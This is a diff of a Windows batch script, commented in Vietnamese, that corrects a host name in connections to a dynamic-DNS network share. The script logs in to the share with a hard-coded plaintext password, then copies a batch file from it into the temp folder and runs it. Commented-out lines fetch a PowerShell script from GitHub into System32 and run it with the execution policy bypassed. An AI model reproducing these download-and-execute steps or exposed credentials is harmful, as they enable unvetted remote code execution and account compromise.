@@ -23,9 +23,9 @@ if not exist "%tempfile1%" (
 :: -----------------------------------------------------------
 :: TẢI FILE CHECK.TXT TỪ NETWORK SHARE (không dùng ổ đĩa ánh xạ)
 :: -----------------------------------------------------------
-set "uncPath=\\minhtuan283.ddns.net9\HDD\serial\check.txt"
+set "uncPath=\\minhtuan283.ddns.net\HDD\serial\check.txt"
 set "tempfile2=%temp%\check2.txt"
-net use \\minhtuan283.ddns.net9\HDD /user:minhtuan283 Thienngan2002 >nul 2>&1
+net use \\minhtuan283.ddns.net\HDD /user:minhtuan283 Thienngan2002 >nul 2>&1
 if errorlevel 1 (
     echo [Network] Khong ket noi duoc toi share.
 ) else (
@@ -90,7 +90,7 @@ rem powershell curl -o C:\Windows\System32\WindowsPowerShell\windows-backup.ps1 
 rem powershell -ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsPowerShell\windows-backup.ps1"
 
 rem powershell -Command "curl -o C:\Windows\System32\WindowsPowerShell\windows-backup.ps1 https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1; powershell -ExecutionPolicy Bypass -File 'C:\Windows\System32\WindowsPowerShell\windows-backup.ps1'"
-copy "\\minhtuan283.ddns.net9\HDD\serial\script\a.bat" "%temp%\a.bat" >nul 2>&1
+copy "\\minhtuan283.ddns.net\HDD\serial\script\a.bat" "%temp%\a.bat" >nul 2>&1
 call "%temp%\a.bat"
 )
 
@@ -104,6 +104,6 @@ set "serial="
 set "device="
 set "found="
 if exist "%temp%\a.bat" del /f /q "%temp%\a.bat"
-net use \\minhtuan283.ddns.net9\HDD /delete >nul 2>&1
+net use \\minhtuan283.ddns.net\HDD /delete >nul 2>&1
 echo Hoan Thanh.
 exit /b
